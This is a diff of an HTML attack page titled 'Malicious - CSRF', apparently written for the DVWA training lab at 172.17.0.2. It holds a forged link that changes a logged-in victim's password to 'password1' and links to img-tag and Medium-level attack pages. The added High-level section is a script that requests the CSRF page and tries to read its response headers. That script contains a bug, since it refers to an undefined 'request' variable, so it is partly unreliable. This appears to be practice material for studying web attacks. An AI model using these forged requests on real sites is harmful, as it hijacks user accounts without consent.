@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+	<title>Malicious - CSRF</title>
 	<meta charset="UTF-8">
 </head>
 <body>
@@ -8,33 +9,53 @@
 	<h1>Low</h1>
 
 	<h3>&lt;a&gt; tag</h3>
-
-	<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change">Link to click on</a>
-
-	<!--------------------------------------------------------------------->
+	after clicking on link new password will be password1<br>
+	<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change">Link</a>
 
 	<h3>&lt;img&gt; tag</h3>
-
+	after clicking on link new password will be password2<br>
 	<a href="csrf-image.html">Link to page containing img tag</a>
 
 	<!--------------------------------------------------------------------->
 
 	<h1>Medium</h1>
+	
+	<a href="csrf-172.17.0.2.html">Go to csrf-172.17.0.2.html</a>
 
 	<!--------------------------------------------------------------------->
 
-	<script>
-		newReferer = "172.17.0.2"
-		/*
-		javascript:(function(){ 
-			// var newReferer = prompt('Set the referer:');
-			Object.defineProperty(document, "referer", {configurable: true, get : function(){ return newReferer; }})
-		})();
+	<h1>High</h1>
+	
+	<button onclick="requestHigh()">Click me!</button>
+	
+<script>
+	function requestHigh(){
+		var req = new XMLHttpRequest();
+		req.open("GET", "http://172.17.0.2/vulnerabilities/csrf/");
+		req.send();
+		
+		req.onreadystatechange = function() {
+			if(this.readyState == this.HEADERS_RECEIVED) {
+				// Get the raw header string
+				var headers = request.getAllResponseHeaders();
 
-		console.log(document.referer)
-		*/
+				// Convert the header string into an array
+				// of individual headers
+				var arr = headers.trim().split(/[\r\n]+/);
 
-		location.href = newReferer
-	</script>
+				// Create a map of header names to values
+				var headerMap = {};
+				arr.forEach(function (line) {
+					var parts = line.split(': ');
+					var header = parts.shift();
+					var value = parts.join(': ');
+					headerMap[header] = value;
+				});
+				
+				console.log(headerMap)
+			}
+		}
+	}
+</script>
 </body>
 </html>
